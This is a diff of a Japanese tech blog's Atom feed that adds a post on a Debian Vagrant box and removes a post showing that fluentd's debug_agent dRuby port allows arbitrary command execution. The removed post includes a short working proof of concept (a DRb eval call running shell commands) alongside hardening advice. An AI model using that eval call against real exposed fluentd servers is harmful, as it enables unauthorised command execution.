@@ -4,7 +4,7 @@
   <title><![CDATA[@znz blog]]></title>
   <link href="http://blog.n-z.jp/atom.xml" rel="self"/>
   <link href="http://blog.n-z.jp/"/>
-  <updated>2014-07-18T19:42:08+09:00</updated>
+  <updated>2014-07-18T22:12:26+09:00</updated>
   <id>http://blog.n-z.jp/</id>
   <author>
     <name><![CDATA[Kazuhiro NISHIYAMA]]></name>
@@ -12,6 +12,64 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Vagrant CloudからWheezyを入れてみた]]></title>
+    <link href="http://blog.n-z.jp/blog/2014-07-18-wheezy-from-vagrant-cloud.html"/>
+    <updated>2014-07-18T21:30:25+09:00</updated>
+    <id>http://blog.n-z.jp/blog/wheezy-from-vagrant-cloud</id>
+    <content type="html"><![CDATA[<p>Debian 7.6 がリリースされたので、新しい box がないか探してみたところ、
+<a href="http://www.vagrantbox.es/" title="A list of base boxes for Vagrant - Vagrantbox.es">A list of base boxes for Vagrant &ndash; Vagrantbox.es</a>
+から探すのではなく
+<a href="https://vagrantcloud.com/">Vagrant Cloud</a>
+を使えば良いということがわかりました。</p>
+
+<!--more-->
+
+
+<h2>動作確認バージョン</h2>
+
+<ul>
+<li>VirtualBox 4.3.12</li>
+<li>Vagrant 1.6.3</li>
+<li><a href="https://vagrantcloud.com/ffuenf/debian-7.6.0-amd64" title="Debian Wheezy 7.6.0 x86_64">Debian Wheezy 7.6.0 x86_64</a> 0.0.27</li>
+</ul>
+
+
+<h2>書き換え</h2>
+
+<p>古い box は</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  config.vm.box = ENV["VM_BOX"] || "opscode_debian-7.4_chef-provisionerless"
+</span><span class='line'>  config.vm.box_url = ENV["VM_BOX_URL"] || "http://opscode-vm-bento.s3.amazonaws.com/vagrant/virtualbox/opscode_debian-7.4_chef-provisionerless.box"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>と指定していたのを
+<a href="https://github.com/ffuenf/vagrant-boxes" title="ffuenf/vagrant-boxes">ffuenf/vagrant-boxes</a>
+からリンクされている
+<a href="https://vagrantcloud.com/ffuenf/debian-7.6.0-amd64" title="ffuenf/debian-7.6.0-amd64">ffuenf/debian-7.6.0-amd64</a>
+の説明通り <code>vagrant init ffuenf/debian-7.6.0-amd64</code> で作成された
+<code>Vagrantfile</code> を参考にして、</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  config.vm.box = "ffuenf/debian-7.6.0-amd64"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>に書き換えました。</p>
+
+<p>以前の box を使っている 古い VM を <code>vagrant destroy</code> ですべて破棄した後、
+<code>vagrant box remove opscode_debian-7.4_chef-provisionerless</code>
+で box も削除しました。</p>
+
+<h2>余談</h2>
+
+<p><code>vagrant box outdated</code> や <code>vagrant box update</code> の使い方がわからなかったのですが、
+<code>box_url</code> でダウンロードしてきた box で使うものではなく Vagrant Cloud から
+ダウンロードしてきた box で使うものだったようです。</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[rsyslogでherokuのログを記録する]]></title>
@@ -3402,102 +3460,6 @@ Google 電卓で検算できるのが便利でした。</p>
 <h2>感想</h2>
 
 <p>twitter のハッシュタグ (<code>#シェル芸</code>) での他の人の解答を参考にしたり、自分の解答を紹介したりできたり、頭リダイレクトが流行ったりして面白かったです。</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[fluentd に drb で接続してみた]]></title>
-    <link href="http://blog.n-z.jp/blog/2014-06-13-fluentd-drb.html"/>
-    <updated>2014-06-13T22:41:08+09:00</updated>
-    <id>http://blog.n-z.jp/blog/fluentd-drb</id>
-    <content type="html"><![CDATA[<p>druby の口が公開されていたら、そのユーザーの権限で何でも実行できるはず、
-ということで、ちょっと試してみました。</p>
-
-<!--more-->
-
-
-<h2>対象バージョン</h2>
-
-<ul>
-<li><code>ruby</code> 2.1.2</li>
-<li><code>fluentd</code> 0.10.49</li>
-</ul>
-
-
-<h2>環境の準備</h2>
-
-<p>vagrant 上で rbenv と ruby-build を使ってインストールした ruby 2.1.2 で</p>
-
-<ul>
-<li><code>gem install fluentd</code></li>
-<li><code>fluentd --setup /vagrant/fluent</code></li>
-<li><code>fluentd -c /vagrant/fluent/fluent.conf &amp;</code></li>
-</ul>
-
-
-<p>と起動して準備しておきました。</p>
-
-<h2>実行例</h2>
-
-<p><code>irb</code> を起動しているユーザーと同じユーザーで <code>fluentd</code> も起動しているので、
-特に面白いことはできそうになかったのですが、
-<code>/proc/$$/cmdline</code> を確認すると <code>irb</code> 側ではなく、
-ちゃんと <code>fluentd</code> 側で任意のコマンドが実行できていることがわかります。</p>
-
-<pre><code>vagrant@fluentd-vm:~$ rbenv exec irb -r irb/completion --simple-prompt
-&gt;&gt; require 'drb'
-=&gt; true
-&gt;&gt; d = DRbObject.new_with_uri('druby://127.0.0.1:24230'); nil
-=&gt; nil
-&gt;&gt; d.method_missing(:send, :eval, "`id`")
-=&gt; "uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)\n"
-&gt;&gt; d.method_missing(:send, :eval, '`cat /proc/$PPID/cmdline`')
-=&gt; "/opt/rbenv/versions/2.1.2/bin/ruby\x00/opt/rbenv/versions/2.1.2/bin/fluentd\x00-c\x00/vagrant/fluent/fluent.conf\x00"
-</code></pre>
-
-<h2>雑感</h2>
-
-<p><code>root</code> 権限で起動しているなら <code>debug_agent</code> は有効にしない方が良さそうだし、
-ローカルユーザーが <code>fluentd</code> の実行ユーザーの権限を使えるとまずい場合も有効にしない方が良さそうだと思いました。</p>
-
-<p>また、知っている人には当たり前のことですが、
-<code>drb</code> は外部に安全に公開できるものではないので、
-使う場合も <code>localhost</code> だけ待ち受けるように制限すべきです。</p>
-
-<p>td-agent は初期設定でそうなっているのですが、
-<code>fluentd --setup</code> はそうなっていないので、
-適切に設定を変更するなり firewall で塞ぐなりしておく必要がありそうです。</p>
-
-<h2>td-agent 1.1.19-1 での初期設定</h2>
-
-<p><code>127.0.0.1</code> だけで待ち受けるようになっていました。</p>
-
-<pre><code>## live debugging agent
-&lt;source&gt;
-  type debug_agent
-  bind 127.0.0.1
-  port 24230
-&lt;/source&gt;
-</code></pre>
-
-<h2><code>fluentd --setup</code> で生成される設定</h2>
-
-<p>外からも受けつけるようになっていました。</p>
-
-<pre><code># Listen DRb for debug
-&lt;source&gt;
-  type debug_agent
-  port 24230
-&lt;/source&gt;
-</code></pre>
-
-<h2>参考</h2>
-
-<ul>
-<li><a href="http://docs.ruby-lang.org/ja/2.1.0/library/drb.html">るりま の DRb</a> のセキュリティ</li>
-<li><a href="http://docs.ruby-lang.org/en/2.1.0/DRb.html#module-DRb-label-Security">RDoc の DRb の Security の説明</a> (英語)</li>
-</ul>
-
 ]]></content>
   </entry>
   
